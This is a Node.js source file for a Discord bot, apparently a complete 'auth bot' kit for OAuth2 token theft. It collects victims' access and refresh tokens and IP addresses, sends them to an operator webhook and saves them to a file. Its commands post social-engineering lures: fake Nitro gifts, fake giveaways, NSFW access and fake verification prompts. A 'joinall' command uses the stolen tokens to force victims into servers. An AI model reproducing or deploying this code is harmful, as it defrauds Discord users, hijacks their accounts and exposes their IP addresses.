const Discord = require('discord.js');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    Discord.Intents.FLAGS.GUILD_BANS,
    Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
    Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
    Discord.Intents.FLAGS.GUILD_WEBHOOKS,
    Discord.Intents.FLAGS.GUILD_INVITES,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    Discord.Intents.FLAGS.GUILD_PRESENCES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
  ],
  presence: {
    activity: {
      name: `Auth Bot V5`,
      type: "LISTENING",
    },
    status: "online"
  }
});
const kalash = require("./kalash");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");


process.on("unhandledRejection", err => console.log(err))


app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/kalashallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', kalash.client_id)
  form.append('client_secret', kalash.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', kalash.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token



      const tgg = { headers: { authorization: `${cdcd.token_type} ${ac_token}`, } }
      axios.get('https://discordapp.com/api/users/@me', tgg)
        .then((te) => {
          let efjr = te.data.id
          fs.readFile('./object.json', function(res, req) {
            if (
              JSON.parse(req).some(
                (ususu) => ususu.userID === efjr
              )
            ) {
              console.log(


                `[-] ${ip} - ` +
                te.data.username +
                `#` +
                te.data.discriminator
              )
              return
            }
            console.log(
              `[+] ${ip} - ` +
              te.data.username +
              '#' +
              te.data.discriminator
            )
            avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${kalash.wehbook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **New User**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `<:fleche:998161473081724930> Pseudo: \`${te.data.username}#${te.data.discriminator}\`` +

                      `\n\n<:fleche:998161473081724930> IP: \`${ip}\`` +
                      `\n\n<:fleche:998161473081724930> ID: \`${te.data.id}\`` +
                      `\n\n<:fleche:998161473081724930> Acces Token: \`${ac_token}\`` +
                      `\n\n<:fleche:998161473081724930> Refresh Token: \`${rf_token}\``,


                  },
                ],
              }),
            })
            var papapa = {
              userID: te.data.id,
              userIP: ip,
              avatarURL: avatarHASH,
              username:
                te.data.username + '#' + te.data.discriminator,
              access_token: ac_token,
              refresh_token: rf_token,
            },
              req = []
            req.push(papapa)
            fs.readFile('./object.json', function(res, req) {
              var jzjjfj = JSON.parse(req)
              jzjjfj.push(papapa)
              fs.writeFile(


                './object.json',
                JSON.stringify(jzjjfj),
                function(eeeeeeeee) {
                  if (eeeeeeeee) {
                    throw eeeeeeeee
                  }
                }
              )
            })
          })
        })
        .catch((errrr) => {
          console.log(errrr)
        })
    })
})

client.on("ready", () => {

  console.log(`${chalk.blue('AUTH BOT V.4 ( ! epic#0001 )')}\n${chalk.green('->')} The bot is connected to [ ${client.user.username} ], it uses   : ${kalash.prefix}\n${chalk.green('->')} invite of bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
})


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(kalash.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();



  if (cmd === "wl") {
    if (!kalash.owners.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user.username}** has been added to the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({


            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user2.username}** has been removed from the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user2.username}** is not whitelisted`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
            description: `${content}`,
            color: "2F3136",
            footer: {
              "text": `${kalash.client} ・ ${kalash.footer}`,
              "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]


        })
        break;
    }
  }

  if (cmd === "mybot") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    const embed = new Discord.MessageEmbed()

      .setTitle('You bot')
      .setDescription(`[${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8): This is plexus bot!`)
      .setColor("#FF0000")

    ctx.channel.send({
      embeds: [embed]
    })
  }


  if (cmd === "test") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.yes} The bot is working!`

      }],
    })
  }

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.user} Galaxy Dashboard\n`,


        description: `\n ${emoji.point}**  0auth2**\n[\`joinall\`](https://discord.gg/galaxygw), [\`Users\`](https://discord.gg/galaxygw), [\`links\`](${kalash.support})\n\n${emoji.point}** Whitelist**\n[\`wl list\`](https://discord.gg/galaxygw)
[\`wl add\`](https://discord.gg/galaxygw)\n [\`wl remove\`](https://discord.gg/galaxygw)\n
(https://discord.gg/galaxygw)\n\n${emoji.point}** Other**\n[\`boost\`](https://discord.gg/galaxygw}), \n[\`classic\`](https://discord.gg/galaxygw), \n[\`nsfw\`](https://discord.gg/galaxygw}),\n[\`giveaway\`](https://discord.gg/galaxygw), [\`botinfo\`](https://discord.gg/galaxygw)\n\n${emoji.point} **Prefix** [\`${kalash.prefix}\`](https://discord.gg/galaxygw})\n${emoji.info} *Message sent to users when they authorized:*\n\`\`\`You have won Nitro wait 24h to get the code 🎁\`\`\``,
        footer: {
          "text": `Bot made by plexus! ${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }

      }],
    })
  }

  if (cmd === "botinfo") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    let embed = new Discord.MessageEmbed()
      .setAuthor(client.user.username, client.user.displayAvatarURL({ dynamic: true }))
      .setColor('RANDOM')
      .setURL('https://discord.gg/Galaxygw')
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))


      .addFields(
        { name: "🤖・Information", value: `> **Name :** <@${client.user.id}> \`\`${client.user.username}\`\`\n> **ID :** ${client.user.id}\n> **Date of creation :** \`\`${client.user.createdAt}\`\``, inline: false },
        { name: "🔨・Developper", value: `> **Name :**  plexus`, inline: false },
        { name: ":bar_chart:・Stats bot :", value: `> **Servers :** ${client.guilds.cache.size}\n> **Utilisateurs :** [COMMING SOON]\n> **Salons :** ${client.channels.cache.size}\n> **Ping avec l'API Discord :** ${client.ws.ping}`, inline: false },
        { name: ":gear:・Informations techniques :", value: `> **Host :** Eheberg\n> **memory : **437 Mo\n> **Node.js :** v17.9.1\n> **discord.js :** v13.8.0`, inline: false }
      )
    ctx.channel.send({
      embeds: [embed]
    })
  }
  if (cmd === "mybot") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: []
    })
  }
  if (cmd === "partner") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.partner} Would you like to do Auth4Auth?`,
        description: `> **dont hesitate to join the server [Galaxy giveaways!](https://discord.gg/galaxygw) **`,
        color: "2F3136",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }]
    })
  }
  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.link} Oauth/Invite:`,
        description: `${emoji.point} **Your OAuth2 Link:** ${kalash.authLink}\n\`\`\`${kalash.authLink}\`\`\`\n${emoji.point} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "2F3136",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }],
      "components": [
       {
         "type": 1,
         "components": [
           {
             "type": 2,
             "style": 5,
             "label": "Bot invite",
             "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
           }
         ]
       }
     ]
    })
  }

if (cmd === "boost") {
       if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
       ctx.channel.send({
  
         embeds: [{
           title: `Hello everyone, you have all been gifted Discord Nitro for a year!`,

           description: `To get your Discord Nitro all you must do is:
   \n1️⃣ Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣ Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
           "color": 7540649,
           "image": {
         "url": "https://media.discordapp.net/attachments/1009463535551660032/1010011666517336124/unknown.jpg"
           },
         
           footer: { 
             "text":  `・ ${kalash.footer}`,
             "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
           }
  
             }
         ],
         "components": [
       {
         "type": 1,
         "components": [
           {
             "type": 2,
             "style": 5,
             "label": "Claim your nitro",
             "url": `${kalash.authLink}`
           }
         ]
       }
     ]
  
  
           })
     }

  if (cmd === "classic") {
       if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
       ctx.channel.send({
  
         embeds: [{
           title: `Hello everyone, you have all been gifted  Nitro classic for a year!`,

           description: `To get your  Nitro classic all you must do is:
   \n1️⃣ Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣ Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
           "color": 7540649,
           "image": {
         "url": "https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png"
           },
         
           footer: { 
             "text":  `・ ${kalash.footer}`,
             "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
           }
  
             }
         ],
         "components": [
       {
         "type": 1,
         "components": [
           {
             "type": 2,
             "style": 5,
             "label": "Claim your nitro",
             "url": `${kalash.authLink}`
           }
         ]
       }
     ]
  
  
           })
     }

   if (cmd === "giveaway") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
     ctx.channel.send({
       "content": "Giveaway for Nitro 1 Year has been made! 🎁",
         embeds: [{
           title: `🎉 **Giveaway** 🎉`,

           description: `\n:gift: **WINNERS:** \`1\`\n:tada: **TIMER**: \`24h\`\n:gift: **PRIZE:** \`Nitro Boost 1 Year\`\n:tada: **HOSTED BY: <@${ctx.author.id}>**\n\n:link: __**Requirements:**__\n:link: **Must stay in the server.**\n\nTo enter the giveaway click on the enter button`,
           "color": 0,
         
           footer: { 
             "text":  `・ ${kalash.footer}`,
             "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
           }
  
             }
         ],
         "components": [
       {
         "type": 1,
         "components": [
           {
             "type": 2,
             "style": 5,
             "label": "Enter🎉",
             "url": `${kalash.authLink}`
           }
         ]
       }
     ]
  
  
           })
     }
    
   
if (cmd === "cleans") {
    await client.clean(message)
  }

  if (cmd === "refresh") {
    await client.refreshTokens(message)
  }

     if (cmd === "nsfw") {
       if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
       ctx.channel.send({
  
         embeds: [{
  
           description: `**To be able to see nudes and nsfw channels click\n [here!](${kalash.authLink})🔞 **`,
           "color": 16711680,
  
  
             }
       ],
         "components": [
       {
         "type": 1,
         "components": [
           {
             "type": 2,
             "style": 5,
             "label": "Gain access here",
             "url": `${kalash.authLink}`
           }
         ]
       }
     ]


        })
       
   }
     if (cmd === "verify") {
       if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
       ctx.channel.send({
  
         embeds: [{
  
           description: `**To be able to see the private giveaways channels and chat channels click\n [here!](${kalash.authLink}) ✅ **`,
           "color": 16711680,
  
  
             }
       ],
         "components": [
       {
         "type": 1,
         "components": [
           {
             "type": 2,
             "style": 5,
             "label": "✅",
             "url": `${kalash.authLink}`
           }
         ]
       }
     ]


        })
   }

  if (cmd === "check") {
       if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
       ctx.channel.send({
  
         embeds: [{
  
           description: `**:link: Mentioned users is not Verified ❌!!!! 
           Please Verify Your Self Click [here!](${kalash.authLink}) !! **`,
           "color": 16711680,
  
  
             }
       ],
         "components": [
       {
         "type": 1,
         "components": [
           {
             "type": 2,
             "style": 5,
             "label": "Verify Now",
             "url": `${kalash.authLink}`
           }
         ]
       }
     ]


        })
   }

  if (cmd === "joinall") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.load} **Joining users...** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })

     

      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.load} **Joining users...** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++
        })
        success++
      }

      clearInterval(inter);

      msg.edit({
        embeds: [{
          title: `${emoji.user} 0auth2 Joinall`,
          description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} **Success**: ${success}\n${emoji.error} **Error**: ${error}`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }]
      }).catch(() => { })
    })
  }
  if (cmd === "users") {




    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} OAuth2 Users:`,
          description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\nType command \`links\` to check your OAuth2 link`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }

        }]
      })
    })
  }
})

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(kalash.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID`)
})


app.listen(kalash.port, () => console.log('Connecting...'))